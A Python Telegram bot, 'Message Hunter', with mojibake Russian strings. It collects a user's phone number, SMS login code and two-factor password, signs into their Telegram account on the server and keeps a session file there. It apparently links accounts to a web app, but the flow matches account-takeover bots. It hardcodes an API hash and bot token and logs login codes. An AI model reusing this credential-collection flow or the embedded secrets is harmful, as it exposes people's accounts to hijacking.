from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import json
import asyncio
import time

# API –¥–∞–Ω–Ω—ã–µ
API_ID = 29318340
API_HASH = "68be30e447857e5e5aa24c23a41c686d"
BOT_TOKEN = "8083238823:AAHgAcvKL7nf29zz66kGB3bL6QCSHOVXCRA"

# –°–æ–∑–¥–∞—ë–º –±–æ—Ç–∞
bot_app = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# –°–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_states = {}
user_clients = {}
temp_auth_data = {}

def save_user_session(user_id, session_data):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Å–µ—Å—Å–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        os.makedirs('user_sessions', exist_ok=True)
        with open(f'user_sessions/{user_id}.json', 'w', encoding='utf-8') as f:
            json.dump(session_data, f, ensure_ascii=False, indent=2)
        print(f"‚úÖ –°–µ—Å—Å–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –¥–ª—è {user_id}")
            
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏: {e}")

@bot_app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    
    print(f"ü§ñ –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ /start –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä
    if len(message.command) > 1:
        param = message.command[1]
        
        if param == 'web_auth':
            # –í–µ–±-–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
            print(f"üåê –í–µ–±-–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
            
            user_states[user_id] = {
                'web_user_id': f'web_{user_id}',
                'step': 'waiting_phone'
            }
            
            await message.reply_text(
                "üåê **–í–µ–±-–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è Message Hunter**\n\n"
                "üì± –û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\n"
                "`+380991234567`\n\n"
                "–ü–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ –±—Ä–∞—É–∑–µ—Ä –∏ –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é'"
            )
        else:
            # –û–±—ã—á–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
            await start_auth_process(message, user_id, param)
    else:
        # –û–±—ã—á–Ω—ã–π —Å—Ç–∞—Ä—Ç
        await message.reply_text(
            "üîç **Message Hunter Bot**\n\n"
            "–≠—Ç–æ—Ç –±–æ—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ –∫ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—é.\n\n"
            "–î–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã:\n"
            "‚Ä¢ –ü–µ—Ä–µ–π–¥–∏—Ç–µ –Ω–∞ —Å–∞–π—Ç\n"
            "‚Ä¢ –ò–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ /start –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏"
        )

@bot_app.on_message(filters.text & filters.private & ~filters.command("start"))
async def handle_text(client, message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    print(f"üìù –ü–æ–ª—É—á–µ–Ω —Ç–µ–∫—Å—Ç –æ—Ç {user_id}: {text}")
    print(f"üîç –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è: {list(user_states.keys())}")
    
    if user_id not in user_states:
        await message.reply_text(
            "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.\n\n"
            f"üîç **–û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:**\n"
            f"–í–∞—à ID: `{user_id}`\n"
            f"–ê–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏: {len(user_states)}\n\n"
            f"–ü–æ–ª—É—á–∏—Ç–µ –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç–µ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ /start"
        )
        return
    
    user_data = user_states[user_id]
    print(f"üìä –°–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}: {user_data}")
    
    if user_data['step'] == 'waiting_phone':
        await handle_phone_input(client, message, user_id, text, user_data)
    elif user_data['step'] == 'waiting_code':
        await handle_code_input(client, message, user_id, text, user_data)
    elif user_data['step'] == 'waiting_2fa':
        await handle_2fa_input(client, message, user_id, text, user_data)

async def handle_phone_input(client, message, user_id, phone, user_data):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
    if not (phone.startswith('+') and len(phone) >= 10):
        await message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `+380991234567`")
        return
    
    try:
        print(f"üì± –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –Ω–∞ –Ω–æ–º–µ—Ä: {phone}")
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∏–µ–Ω—Ç –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        session_name = f"user_session_{user_data['web_user_id']}"
        user_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        
        await user_client.connect()
        sent_code = await user_client.send_code(phone)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
        user_clients[user_id] = user_client
        temp_auth_data[user_id] = {
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash
        }
        
        user_states[user_id]['step'] = 'waiting_code'
        
        print(f"‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ {phone}")
        
        await message.reply_text(
            f"üì® **–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ {phone}**\n\n"
            f"‚è±Ô∏è –í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ SMS:\n"
            f"–ù–∞–ø—Ä–∏–º–µ—Ä: `12345`"
        )
        
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞: {e}")
        await message.reply_text(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞: {str(e)}")

async def handle_code_input(client, message, user_id, code, user_data):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ SMS –∫–æ–¥–∞"""
    if not (code.isdigit() and len(code) == 5):
        await message.reply_text("‚ùå –í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ (—Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã)")
        return
    
    try:
        print(f"üîê –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥: {code}")
        
        auth_data = temp_auth_data[user_id]
        user_client = user_clients[user_id]
        
        # –ê–≤—Ç–æ—Ä–∏–∑—É–µ–º—Å—è
        await user_client.sign_in(
            auth_data['phone'], 
            auth_data['phone_code_hash'], 
            code
        )
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        me = await user_client.get_me()
        await user_client.disconnect()
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–µ—Å—Å–∏—é
        session_data = {
            'is_connected': True,
            'phone': auth_data['phone'],
            'user_info': {
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'user_id': str(me.id)
            }
        }
        
        save_user_session(user_data['web_user_id'], session_data)
        
        # –û—á–∏—â–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        cleanup_user_data(user_id)
        
        print(f"‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –¥–ª—è {me.first_name}")
        
        await message.reply_text(
            f"‚úÖ **–ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω!**\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {me.first_name}\n"
            f"üì± –¢–µ–ª–µ—Ñ–æ–Ω: {auth_data['phone']}\n\n"
            f"–¢–µ–ø–µ—Ä—å –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞ —Å–∞–π—Ç –∏ –Ω–∞–∂–º–∏—Ç–µ **'–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ'**"
        )
        
    except Exception as e:
        error_str = str(e)
        print(f"‚ùå –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {error_str}")
        
        if "SESSION_PASSWORD_NEEDED" in error_str:
            user_states[user_id]['step'] = 'waiting_2fa'
            await message.reply_text(
                "üîê **–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**\n\n"
                "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å 2FA:"
            )
        elif "PHONE_CODE_EXPIRED" in error_str:
            cleanup_user_data(user_id)
            await message.reply_text("‚è∞ –ö–æ–¥ –∏—Å—Ç–µ–∫. –ù–∞—á–Ω–∏—Ç–µ –∑–∞–Ω–æ–≤–æ - –ø–æ–ª—É—á–∏—Ç–µ –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç–µ")
        elif "PHONE_CODE_INVALID" in error_str:
            await message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑")
        else:
            await message.reply_text(f"‚ùå –û—à–∏–±–∫–∞: {error_str}")

async def handle_2fa_input(client, message, user_id, password, user_data):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–∞—Ä–æ–ª—è 2FA"""
    try:
        print(f"üîê –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–∞—Ä–æ–ª—å 2FA")
        
        user_client = user_clients[user_id]
        await user_client.check_password(password)
        
        me = await user_client.get_me()
        await user_client.disconnect()
        
        session_data = {
            'is_connected': True,
            'phone': temp_auth_data[user_id]['phone'],
            'user_info': {
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'user_id': str(me.id)
            }
        }
        
        save_user_session(user_data['web_user_id'], session_data)
        cleanup_user_data(user_id)
        
        print(f"‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —Å 2FA –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –¥–ª—è {me.first_name}")
        
        await message.reply_text(
            f"‚úÖ **–ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω!**\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {me.first_name}\n\n"
            f"–¢–µ–ø–µ—Ä—å –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞ —Å–∞–π—Ç –∏ –Ω–∞–∂–º–∏—Ç–µ **'–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ'**"
        )
        
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ 2FA: {e}")
        await message.reply_text(f"‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å 2FA. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑")

def cleanup_user_data(user_id):
    """–û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        if user_id in user_states:
            del user_states[user_id]
        if user_id in temp_auth_data:
            del temp_auth_data[user_id]
        if user_id in user_clients:
            del user_clients[user_id]
        print(f"üßπ –û—á–∏—â–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö: {e}")

if __name__ == "__main__":
    print("ü§ñ –û—Å–Ω–æ–≤–Ω–æ–π –±–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
    print("üîó –ë–æ—Ç –≥–æ—Ç–æ–≤ –ø—Ä–∏–Ω–∏–º–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã...")
    bot_app.run()